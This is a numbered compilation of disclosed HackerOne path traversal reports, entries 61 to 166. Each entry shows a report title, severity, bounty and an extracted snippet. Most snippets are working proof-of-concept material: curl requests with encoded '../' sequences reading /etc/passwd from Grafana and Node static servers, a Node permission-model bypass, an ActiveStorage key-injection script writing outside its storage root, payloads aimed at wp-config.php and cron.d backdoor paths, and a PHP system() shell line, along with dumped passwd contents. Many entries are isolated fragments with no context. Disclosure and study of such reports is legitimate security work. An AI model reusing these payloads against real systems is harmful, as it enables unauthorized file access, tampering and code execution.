<Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 6e 6f 62 6f 64 79 3a 78 3a 36 35 35 33 34 3a 36 35 35 33 34 3a 4e ... 2103 more bytes>
```

## 61. [#2434811](https://hackerone.com/reports/2434811)  -  Path traversal by monkey-patching Buffer internals
*high, $2,430*

```bash
$ node --experimental-permission --allow-fs-read=/tmp 
Welcome to Node.js v20.8.1.
Type ".help" for more information.
> Buffer.prototype.utf8Write = ((w) => function (str, ...args) {
...   return w.apply(this, [str.replace(/^\/exploit/, '/tmp/..'), ...args]);
... })(Buffer.prototype.utf8Write);
[Function (anonymous)]
> fs.readFileSync(new TextEncoder().encode('/exploit/etc/passwd'))
<Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a 31 3a 64 61 65 6d 6f ... 3174 more bytes>
```

## 62. [#2225660](https://hackerone.com/reports/2225660)  -  Permission model improperly protects against path traversal in Node.js 20
*high, $2,330*

```console
$ node --experimental-permission --allow-fs-read=/tmp/ -p "path.resolve = (s) => s; fs.readFileSync('/tmp/../etc/passwd')"
<Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a 31 3a 64 61 65 6d 6f ... 3174 more bytes>
```

## 63. [#1415820](https://hackerone.com/reports/1415820)  -  Zero day path traversal vulnerability in Grafana 8.x allows unauthenticated arbitrary local file read
*high, $1,000*

```bash
curl https://grafana-303ca6f8-████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

## 64. [#312907](https://hackerone.com/reports/312907)  -  [mcstatic] Path Traversal allows to read content of arbitrary files
*high*

```javascript
// node_modules/mcstatic/lib/responseHandlers.js, line 22:
var streamResponse = function(res, file, stat, next){
    var stream = fs.createReadStream(file);
    res.setHeader('content-length', stat.size);

    stream.pipe(res);
    stream.on('error', function (err) {
        statusHandlers['500'](res, next, { error: err });
    });

    stream.on('end', function () {
        res.statusCode = 200;
        res.end();
    });
};
```

## 65. [#330349](https://hackerone.com/reports/330349)  -  [angular-http-server] Server Directory Traversal
*high*

```bash
$ curl --path-as-is 'http://127.0.0.1:6060//etc/passwd'

##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
...
```

## 66. [#317321](https://hackerone.com/reports/317321)  -  Delete directory using symlink when decompressing tar
*medium, $500*

```bash
$ ls /tmp/dir
file

$ ruby builder.rb

$ gem unpack rm_dir.gem
ERROR:  While executing gem ... (Gem::Package::PathError)
    installing into parent path tmp/dir of /xxx/yyy/zzz/... is not allowed

$ ls /tmp/dir
ls: /tmp/dir: No such file or directory
```

## 67. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```http
puts blob.key  # => "../../traversal_test" (not a secure random token)

# 2. Demonstrate path_for escapes root
```

## 68. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```http
puts service.path_for("../../traversal_test")
```

## 69. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```http
puts "Key: #{poc_key}"
```

## 70. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```http
puts "Resolved path: #{resolved}"
```

## 71. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```http
puts "Escaped root?: #{!resolved.start_with?(storage_root)}"  # => true
```

## 72. [#296254](https://hackerone.com/reports/296254)  -  [serve-here] Static Web Server Directory Traversal via Crafted GET Request
*medium*

```bash
curl "http://<server-IP>:8081/..%2f..%2fetc/passwd"
```

## 73. [#530289](https://hackerone.com/reports/530289)  -  [harp] Path traversal using symlink
*medium*

```bash
$ ln -s ../../../../../etc/passwd sympasswd
```

## 74. [#530289](https://hackerone.com/reports/530289)  -  [harp] Path traversal using symlink
*medium*

```bash
$ curl --path-as-is 0.0.0.0:9000/sympasswd
root:x:0:0:root:/root:/bin/bash
...
```

## 75. [#296282](https://hackerone.com/reports/296282)  -  [augustine] Static Web Server Directory Traversal via Crafted GET Request
*medium*

```bash
curl "http://<server-IP>:8081//etc/passwd"
```

## 76. [#593911](https://hackerone.com/reports/593911)  -  [public] Path traversal using symlink
*medium*

```bash
$ curl http://127.0.0.1:3000/test_passwd
root:x:0:0:root:/root:/bin/bash
```

## 77. [#355501](https://hackerone.com/reports/355501)  -  [servey] Path Traversal allows to retrieve content of any file with extension from remote server
*medium*

```bash
$ node app.js 
open
/../../../../../../etc/passwd
{ Error: ENOENT: no such file or directory, open '/home/rafal.janicki/playground/hackerone/node/static/index.html'
  errno: -2,
  code: 'ENOENT',
  syscall: 'open',
  path: '/home/rafal.janicki/playground/hackerone/node/static/index.html' }
```

## 78. [#355501](https://hackerone.com/reports/355501)  -  [servey] Path Traversal allows to retrieve content of any file with extension from remote server
*medium*

```bash
$ node app.js 
open
/../../../../../../etc/passwd
{ Error: ENOENT: no such file or directory, open '/home/rafal.janicki/playground/hackerone/node/static/index.html'
  errno: -2,
  code: 'ENOENT',
  syscall: 'open',
  path: '/home/rafal.janicki/playground/hackerone/node/static/index.html' }
/../../../../../../etc/hosts.allow
```

## 79. [#310671](https://hackerone.com/reports/310671)  -  [file-static-server] Path Traversal allows to read content of arbitrary file on the server
*low*

```http
getFilePath: function () {
```

## 80. [#310671](https://hackerone.com/reports/310671)  -  [file-static-server] Path Traversal allows to read content of arbitrary file on the server
*low*

```http
getStream: function () {
```

## 81. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```ruby
# 1. Demonstrate that a malicious key bypasses has_secure_token
blob = ActiveStorage::Blob.build_after_unfurling(
  key: "../../traversal_test",
  io: StringIO.new("pwned"),
  filename: "test.txt"
)
puts blob.key  # => "../../traversal_test" (not a secure random token)

# 2. Demonstrate path_for escapes root
service = ActiveStorage::Blob.service  # DiskService instance
puts service.path_for("../../traversal_test")
# => "/rails/storage/../../tr/../../traversal_test"
# Resolves to a path outside /rails/storage/

# 3. Demonstrate via attach (simulating application code)
user = User.new(name: "test")
user.avatar.attach(
  io: StringIO.new("arbitrary content"),
  filename: "innocent.txt",
  key: "../../tmp/activestorage_poc_#{SecureRandom.hex(4)}"
)
user.save!

# Verify file was written outside storage root
poc_key = user.avatar.blob.key
resolved = File.expand_path(service.path_for(poc_key))
storage_root = File.expand_path(service.root)
puts "Key: #{poc_key}"
puts "Resolved path: #{resolved}"
puts "Escaped root?: #{!resolved.start_with?(storage_root)}"  # => true
```

## 82. [#309120](https://hackerone.com/reports/309120)  -  [angular-http-server] Path Traversal in angular-http-server.js allows to read arbitrary file from the remote server
*high*

```bash
$ ./node_modules/angular-http-server/angular-http-server.js --path ./
Path specified: ./
Using index.html
Listening on 8080
Sending ../../../../../etc/passwd with Content-Type application/octet-stream
```

## 83. [#827052](https://hackerone.com/reports/827052)  -  Arbitrary file read via the UploadsRewriter when moving and issue
*critical, $20,000*

```
../../../../../../../../../../../../../../etc/passwd)
```

## 84. [#436928](https://hackerone.com/reports/436928)  -  RCE as Admin defeats WordPress hardening and file permissions
*critical*

```
../../../../../../../var/tmp/content/../../../../../../home/simon/html/wordpress/../../../../../../va
```

## 85. [#436928](https://hackerone.com/reports/436928)  -  RCE as Admin defeats WordPress hardening and file permissions
*critical*

```
../../../../../../../var/tmp/)
```

## 86. [#436928](https://hackerone.com/reports/436928)  -  RCE as Admin defeats WordPress hardening and file permissions
*critical*

```
../../../../../../../var/tmp/content/../../../../../../home/simon/html/wordpress/
```

## 87. [#291878](https://hackerone.com/reports/291878)  -  Arbitrary file deletion in wp-core - guides towards RCE and information disclosure
*critical*

```
../../../../wp-config.php`
```

## 88. [#291878](https://hackerone.com/reports/291878)  -  Arbitrary file deletion in wp-core - guides towards RCE and information disclosure
*critical*

```
../../../../wp-config-slavco.php
```

## 89. [#306607](https://hackerone.com/reports/306607)  -  [html-pages] Path Traversal in html-pages module allows to read any file from the server with curl
*critical*

```
../../../../../Users/bl4de/.vimrc
```

## 90. [#306607](https://hackerone.com/reports/306607)  -  [html-pages] Path Traversal in html-pages module allows to read any file from the server with curl
*critical*

```
../../../../../etc/passwd
```

## 91. [#358645](https://hackerone.com/reports/358645)  -  [serve] Server Directory Traversal
*critical*

```
../../../../../../etc/passwd
```

## 92. [#822262](https://hackerone.com/reports/822262)  -  Path traversal in Nuget Package Registry
*high, $12,000*

```
../../../../../nyangawa
```

## 93. [#2995025](https://hackerone.com/reports/2995025)  -  Mozilla VPN Clients: RCE via file write and path traversal
*high, $6,000*

```
${attacker_server}
```

## 94. [#1415820](https://hackerone.com/reports/1415820)  -  Zero day path traversal vulnerability in Grafana 8.x allows unauthenticated arbitrary local file read
*high, $1,000*

```bash
$ curl https://grafana-303ca6f8-███████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
███
█████
██████
██████████
██████████
████████
██████
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
systemd-coredump:x:992:991:systemd Core Dumper:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
systemd-timesync:x:991:990:systemd Time Synchronization:/:/sbin/nologin
██████████
dbus:x:81:81:System message bus:/:/sbin/nologin
█████
████████
██████
█████████
██████████
███
██████████
███
█████
█████████
██████████
███
███
# … truncated …
```

## 95. [#1415820](https://hackerone.com/reports/1415820)  -  Zero day path traversal vulnerability in Grafana 8.x allows unauthenticated arbitrary local file read
*high, $1,000*

```
../../../../../../../../../../../../usr/share/grafana/conf/defaults.ini
```

## 96. [#3384150](https://hackerone.com/reports/3384150)  -  Arbitrary File Write
*high*

```
../../../
```

## 97. [#3384150](https://hackerone.com/reports/3384150)  -  Arbitrary File Write
*high*

```
../../../tmp/pwned;exploit
```

## 98. [#765291](https://hackerone.com/reports/765291)  -  Remote code execution via path traversal in Zip extraction in the Extract app
*high*

```
../../../../../../mnt/ncdata/normaluser/files/nextcloud-shell.zip&directory=/../../../../var/www/n
```

## 99. [#1102067](https://hackerone.com/reports/1102067)  -  Authenticated path traversal to RCE
*high*

```
../../../../application/files/9316/1312/5391/png-transparent.png
```

## 100. [#309120](https://hackerone.com/reports/309120)  -  [angular-http-server] Path Traversal in angular-http-server.js allows to read arbitrary file from the remote server
*high*

```
${possibleFilename}
```

## 101. [#310106](https://hackerone.com/reports/310106)  -  [glance] Path Traversal in glance static file server allows to read content of arbitrary file
*high*

```
../../../etc/passwd
```

## 102. [#310106](https://hackerone.com/reports/310106)  -  [glance] Path Traversal in glance static file server allows to read content of arbitrary file
*high*

```
../../../../etc/passwd
```

## 103. [#319003](https://hackerone.com/reports/319003)  -  [stattic] Inproper path validation leads to Path Traversal and allows to read arbitrary files with any extension(s)
*high*

```
../../../../../etc/hosts.deny
```

## 104. [#330285](https://hackerone.com/reports/330285)  -  [mcstatic] Server Directory Traversal
*high*

```
../../../../../../../../../etc/passwd
```

## 105. [#309124](https://hackerone.com/reports/309124)  -  [node-srv] Path Traversal allows to read arbitrary files from remote server
*high*

```
../../../../../etc/hosts
```

## 106. [#403736](https://hackerone.com/reports/403736)  -  [takeapeek] Path traversal allow to expose directory and files
*high*

```
../../../../../../`
```

## 107. [#384939](https://hackerone.com/reports/384939)  -  http-live-simulator npm module is prone to path traversal attacks
*high*

```
../../file.txt`
```

## 108. [#383112](https://hackerone.com/reports/383112)  -  [ponse] Path traversal in ponse module allows to read any file on server
*high*

```
../../../../../../../etc/passwd
```

## 109. [#411405](https://hackerone.com/reports/411405)  -  [http-live-simulator] Path traversal vulnerability
*high*

```
../../../../etc/passwd`
```

## 110. [#827052](https://hackerone.com/reports/827052)  -  Arbitrary file read via the UploadsRewriter when moving and issue
*critical, $20,000*

```markdown
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```

## 111. [#436928](https://hackerone.com/reports/436928)  -  RCE as Admin defeats WordPress hardening and file permissions
*critical*

```
../../../../../../../var/tmp/content/../../../../../../home/simon/html/wordpress/../../../../../../var/tmp/content
```

## 112. [#436928](https://hackerone.com/reports/436928)  -  RCE as Admin defeats WordPress hardening and file permissions
*critical*

```
../../../../../../../var/tmp/
```

## 113. [#436928](https://hackerone.com/reports/436928)  -  RCE as Admin defeats WordPress hardening and file permissions
*critical*

```
chmod('../../../../../../../var/tmp/content/../../../../../../home/simon/html/wordpress/', 0777);
```

## 114. [#1386547](https://hackerone.com/reports/1386547)  -  Disclosure of github access token in config file via nignx off-by-slash
*critical*

```json
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = ████
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
[branch "vespa-2021-Q4"]
	remote = origin
	merge = refs/heads/vespa-2021-Q4
```

## 115. [#358112](https://hackerone.com/reports/358112)  -  [buttle] Path traversal in mid-buttle module allows to read any file in the server.
*critical*

```
var url = req.url;
    if(/\.md$/i.test(url) || /\.markdown/i.test(url)) {
      fs.exists(j(dir, url), function(exists) {
        if(exists) {
          fs.readFile(j(dir, url), {encoding: 'utf8'}, function(err, data) {
            if(err) { return res.end(err.message); }
            res.end(wrapInHtml(md(data)));
          });
        } else {
          next();
        }
      });
    } else {
      next();
}
```

## 116. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```
../../etc/cron.d/evil`
```

## 117. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```
../../malicious
```

## 118. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```
../../../../etc/cron.d/backdoor
```

## 119. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```
../../../../../../tmp/malicious_payload
```

## 120. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```
../../sensitive
```

## 121. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```
../../etc/passwd
```

## 122. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```
../../important_app_config.yml
```

## 123. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```
../../traversal_test
```

## 124. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```
../../tr/../../traversal_test
```

## 125. [#2032778](https://hackerone.com/reports/2032778)  -  Internal machine learning API endpoint for CWE classification is vulnerable to path traversal
*medium*

```
../../..
```

## 126. [#2032778](https://hackerone.com/reports/2032778)  -  Internal machine learning API endpoint for CWE classification is vulnerable to path traversal
*medium*

```
../../../..
```

## 127. [#869888](https://hackerone.com/reports/869888)  -  Path Traversal in App Proxy
*medium*

```
../../?shop=a&Shop=asd
```

## 128. [#924407](https://hackerone.com/reports/924407)  -  Local File Disclosure /Delete On [us-az-vpn.acronis.com]
*medium*

```
../../../../../../+CSCOE+/wrong_url.html
```

## 129. [#1081878](https://hackerone.com/reports/1081878)  -  Arbitrary File Deletion via Path Traversal in image-edit.php
*medium*

```
../../../mainfile.php`
```

## 130. [#342066](https://hackerone.com/reports/342066)  -  [bruteser] Path Traversal allows to read content of arbitrary file
*medium*

```
../../../../../../../../etc/passwd
```

## 131. [#355501](https://hackerone.com/reports/355501)  -  [servey] Path Traversal allows to retrieve content of any file with extension from remote server
*medium*

```
../../../../../../etc/hosts.allow
```

## 132. [#519220](https://hackerone.com/reports/519220)  -  File writing by Directory traversal at actionpack-page_caching and RCE by it
*high, $1,000*

```log
❯ curl "http://localhost:3000/books/1"
<!DOCTYPE html>
...
<p>
  <strong>Name:</strong>
  &lt;% `touch me` %&gt;
</p>
...

❯ ls public
404.html  500.html                          apple-touch-icon.png  favicon.ico
422.html  apple-touch-icon-precomposed.png  books                 robots.txt

❯ cat public/books/1.html
<!DOCTYPE html>
...
<p>
  <strong>Name:</strong>
  &lt;% `touch me` %&gt;
</p>
...
```

## 133. [#519220](https://hackerone.com/reports/519220)  -  File writing by Directory traversal at actionpack-page_caching and RCE by it
*high, $1,000*

```
name: <%= @ book.name %>
```

## 134. [#411519](https://hackerone.com/reports/411519)  -  DNS SRV lookup of file:// sources enables local hijacking of gems
*high, $500*

```
victim$ mkdir -p /home/victim/trusted-gem-path/gems
victim$ (cd /home/victim/trusted-gem-path/gems && gem fetch --clear-sources --source https://rubygems.org/ minitest)
victim$ gem generate_index -d /home/victim/trusted-gem-path
```

## 135. [#411519](https://hackerone.com/reports/411519)  -  DNS SRV lookup of file:// sources enables local hijacking of gems
*high, $500*

```
file:///home/victim/trusted-gem-path
```

## 136. [#411519](https://hackerone.com/reports/411519)  -  DNS SRV lookup of file:// sources enables local hijacking of gems
*high, $500*

```
file://xxx./tmp/attack/home/victim/trusted-gem-path
```

## 137. [#1180697](https://hackerone.com/reports/1180697)  -  Subdomain takeover of v.zego.com
*high*

```
% dig +short v.zego.com
52.214.138.192

% curl v.zego.com
<!-- hackerone.com/ian -->
```

## 138. [#1102067](https://hackerone.com/reports/1102067)  -  Authenticated path traversal to RCE
*high*

```
<?php system("uname -a");?>
```

## 139. [#1102067](https://hackerone.com/reports/1102067)  -  Authenticated path traversal to RCE
*high*

```
bFilename=../../../../application/files/9316/1312/5391/png-transparent.png
```

## 140. [#310943](https://hackerone.com/reports/310943)  -  [general-file-server] Path Traversal vulnerability allows to read content on arbitrary file on the server
*high*

```javascript
// node_modules/general-file-server/server.js, line 77
if (pathname.search('____statics') == 1) {
        currpath = __dirname + pathname

        fs.stat(currpath, function (err, stat) {
            if (err || stat.isDirectory()) {
                endupwith404(res)
            } else {
                res.writeHeader(200, {
                    'Content-Type': mime.lookup(currpath)
                })
                fs.createReadStream(currpath).pipe(res)
            }
        })
    }
```

## 141. [#312889](https://hackerone.com/reports/312889)  -  [localhost-now] Path Traversal allows to read content of arbitrary file
*high*

```javascript
// node_modules/localhost-now/lib/app.js, line 10:
    var url = req.url;

    if (url.indexOf('?') != -1) {
        url = url.split('?')[0];
    }

    var file = url === "/" ? "/index.html" : url;

    fs.readFile(path.normalize(process.cwd()) + file, function(err, data) {
```

## 142. [#403707](https://hackerone.com/reports/403707)  -  [knightjs] Path Traversal allows to read content of arbitrary files
*high*

```
fs.readFile(pathname, (err, data) => {
                if (err) {
                    res.statusCode = 500
                    res.end(`Error getting the file: ${err}.`)
                } else {
                    res.statusCode = 200
                    // based on the URL path, extract the file extention. e.g. .js, .doc, ...
                    const ext = path.parse(pathname).ext
                    // if the file is found, set Content-type and send data
                    res.setHeader('Content-type', mime[ext] || 'text/plain')
                    res.end(data)
                }
            })
```

## 143. [#695416](https://hackerone.com/reports/695416)  -  Path traversal using symlink
*high*

```
hawkeye@ubuntu:~/$ curl localhost:8080/passwdsym
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
...
```

## 144. [#310106](https://hackerone.com/reports/310106)  -  [glance] Path Traversal in glance static file server allows to read content of arbitrary file
*high*

```
me:~/playground/hackerone/Node$ ./node_modules/glance/bin/glance.js --verbose --dir ./node_modules/
glance serving node_modules/ on port 8080
::1 read node_modules/
::1 read node_modules/bash-color/
::1 read node_modules/bash-color/README.md
::1 read ./
::1 read malware_frame.html
::1 read malware.js
ERR404 ::ffff:127.0.0.1 on ../../../etc/passwd
ERR404 ::ffff:127.0.0.1 on ../../../../etc/passwd
::ffff:127.0.0.1 read ../../../../../etc/passwd
::ffff:127.0.0.1 read ../../../../../etc/passwd
```

## 145. [#315760](https://hackerone.com/reports/315760)  -  Path Traversal on Resolve-Path
*high*

```js
require('resolve-path')("C:/windows/temp/", "C:../../")
```

## 146. [#309124](https://hackerone.com/reports/309124)  -  [node-srv] Path Traversal allows to read arbitrary files from remote server
*high*

```javascript
return new Promise((function(_this) {
        return function(resolve, reject) {
          var uri;
          uri = url.parse(req.url);
          return resolve(uri.pathname);
        };
      })(this)).then((function(_this) {
        return function(pathname) {
          filePath = pathname;
          filePath = filePath.replace(/\/$/, "/" + _this.options.index);
          filePath = filePath.replace(/^\//, "");
          filePath = path.resolve(process.cwd(), _this.options.root || './', filePath);
          return _this.processRequest(res, filePath);
        };
```

## 147. [#311216](https://hackerone.com/reports/311216)  -  [626] Path Traversal allows to read arbitrary file from remote server
*high*

```javascript
// node_modules/626/index.js, line 15:

    var url = resolveUrl(req.url);
    var file = path.resolve(url);
    log(url + ': ' + file);

    fs.readFile(file, 'utf8', function (err, content) {
        if (err) {
            return res.end('error: file not found ' + file);
        }
```

## 148. [#312907](https://hackerone.com/reports/312907)  -  [mcstatic] Path Traversal allows to read content of arbitrary files
*high*

```javascript
// node_modules/mcstatic/lib/staticFileHandler.js, line 19:
    var filePath = httpHelpers.getRequestPathFromUrl(req.url);
    var mockedFilePath = findMockFilePath(filePath,mockPaths);
    if(mockedFilePath)
        filePath = mockedFilePath;

    var file = path.normalize(path.join(root,filePath));
    fs.stat(file,function(error, stats){
        if(error)
            return statusHandlers[500](res, nextHandler, { error: error });
```

## 149. [#1952978](https://hackerone.com/reports/1952978)  -  Filesystem experimental permissions policy does not handle path traversal cases.
*high*

```
const fs = module.require('fs')
fs.writeFileSync("/home/kali/restricted/../secret.txt", "Target Overwritten!")
```

## 150. [#312918](https://hackerone.com/reports/312918)  -  [public] Path Traversal allows to read content of arbitrary files
*high*

```javascript
// node_modules/public/bin/public, line 73:
    var pathname = url.parse(req.url).pathname;
    var filePath = path.join(dir, pathname); // Real file path
    var base = filePath.replace(dir, ''); // Base path for browser link
    var abs = path.resolve(filePath); 
    console.log(new Date().toString(), abs);
    fs.readFile(filePath, function(err, data) {
      if (err) {
        (...)
      }
      res.writeHead(200, { 'Content-Type': mime.lookup(filePath) });
      res.end(data);
```

## 151. [#436928](https://hackerone.com/reports/436928)  -  RCE as Admin defeats WordPress hardening and file permissions
*critical*

```
function wp_mkdir_p( $target ) {
...

	if ( file_exists( $target ) )
		return @is_dir( $target );

	// We need to find the permissions of the parent folder that exists and inherit that.
	$target_parent = dirname( $target );
	while ( '.' != $target_parent && ! is_dir( $target_parent ) && dirname( $target_parent ) !== $target_parent ) {
		$target_parent = dirname( $target_parent );
	}

	// Get the permission bits.
	if ( $stat = @stat( $target_parent ) ) {
		$dir_perms = $stat['mode'] & 0007777;
	} else {
		$dir_perms = 0777;
	}

	if ( @mkdir( $target, $dir_perms, true ) ) {

		/*
		 * If a umask is set that modifies $dir_perms, we'll have to re-set
		 * the $dir_perms correctly with chmod()
		 */
		if ( $dir_perms != ( $dir_perms & ~umask() ) ) {
			$folder_parts = explode( '/', substr( $target, strlen( $target_parent ) + 1 ) );
			for ( $i = 1, $c = count( $folder_parts ); $i <= $c; $i++ ) {
				@chmod( $target_parent . '/' . implode( '/', array_slice( $folder_parts, 0, $i ) ), $dir_perms );
			}
		}

		return true;
	}

	return false;
}
```

## 152. [#979110](https://hackerone.com/reports/979110)  -  Internal Path Disclosure
*low, $100*

```
../../../../../.html
```

## 153. [#993975](https://hackerone.com/reports/993975)  -  [zenn-cli] Path traversal on Windows allows the attacker to read arbitrary .md files
*low*

```
${slug.replace(/\//g, "")}
```

## 154. [#993975](https://hackerone.com/reports/993975)  -  [zenn-cli] Path traversal on Windows allows the attacker to read arbitrary .md files
*low*

```
${slug.replace(/[/\\]/g, "")}
```

## 155. [#993975](https://hackerone.com/reports/993975)  -  [zenn-cli] Path traversal on Windows allows the attacker to read arbitrary .md files
*low*

```
${position.replace(/\//g, "")}
```

## 156. [#993975](https://hackerone.com/reports/993975)  -  [zenn-cli] Path traversal on Windows allows the attacker to read arbitrary .md files
*low*

```
${position.replace(/[/\\]/g, "")}
```

## 157. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```ruby
set_callback on, on == :initialize ? :after : :before do
  if new_record? && !query_attribute(attribute)
    send("#{attribute}=", generate_token.call)
  end
end
```

## 158. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```
Attacker-controlled input
    ↓
Hash passed to model.file.attach({ ..., key: "../../malicious" })
    ↓
create_one.rb: **splat passes key: to build_after_unfurling
    ↓
blob.rb: Blob.new(key: "../../malicious", ...)  -  key stored as-is
    ↓
secure_token.rb: callback sees key is present, skips generation
    ↓
disk_service.rb: path_for("../../malicious")
    → File.join(root, folder_for(key), key)
    → escapes storage root directory
    ↓
upload/download/delete operates on arbitrary filesystem path
```

## 159. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```ruby
# After malicious blob is saved with key: "../../etc/passwd"
blob = ActiveStorage::Blob.find(malicious_blob_id)
content = blob.download  # reads /etc/passwd via DiskService
```

## 160. [#3580511](https://hackerone.com/reports/3580511)  -  ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection
*medium*

```ruby
# Blob with key: "../../important_app_config.yml"
blob.purge  # calls service.delete(key) → File.delete(path_for(key))
```

## 161. [#2032778](https://hackerone.com/reports/2032778)  -  Internal machine learning API endpoint for CWE classification is vulnerable to path traversal
*medium*

```
"""
    input = request.input[0]
    title = preprocess_text(input.title)

    top_n = int(
        input.num_of_top_predictions or 3
    )  # as a start, it's by default set as 3

    model_dirpath = pathlib.Path(
        f"{os.path.dirname(__file__)}/../models/report_weakness_id/{request.version}/{request.trained_at}/"
    )

    tokenizer = AutoTokenizer.from_pretrained(model_dirpath, use_fast=True)
```

## 162. [#3634571](https://hackerone.com/reports/3634571)  -  Path Traversal in writeFile via Unsafe Prefix Containment Check Allows Out-of-Directory Writes
*medium*

```python
name = b'../out_pwn/evil.proto'
with open('/tmp/evil.bin', 'wb') as f:
    f.write(bytes([0x0a, len(name)]) + name + b'\x00')
```

## 163. [#924407](https://hackerone.com/reports/924407)  -  Local File Disclosure /Delete On [us-az-vpn.acronis.com]
*medium*

```
### Affected Endpoint for read files:

* https://us-az-vpn.acronis.com/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

## 164. [#1179193](https://hackerone.com/reports/1179193)  -  Subdomain takeover of www2.growasyouplan.com
*medium*

```
% dig +short www2.growasyouplan.com
67.202.62.93

% curl www2.growasyouplan.com
<!-- hackerone.com/ian -->
```

## 165. [#310690](https://hackerone.com/reports/310690)  -  [crud-file-server] Path Traversal allows to read arbitrary file from the server
*medium*

```javascript
// ./node_modules/crud-file-server/crud-file-server.js, line 4:
var cleanUrl = function(url) { 
	url = decodeURIComponent(url);
	while(url.indexOf('..').length > 0) { url = url.replace('..', ''); }
	return url;
};
```

## 166. [#538938](https://hackerone.com/reports/538938)  -  [domokeeper] Unintended Require
*medium*

```
app.get('/plugins/:id', function (req, res) {
  var plugin = require(req.params.id);
  res.json(plugin);
})
```

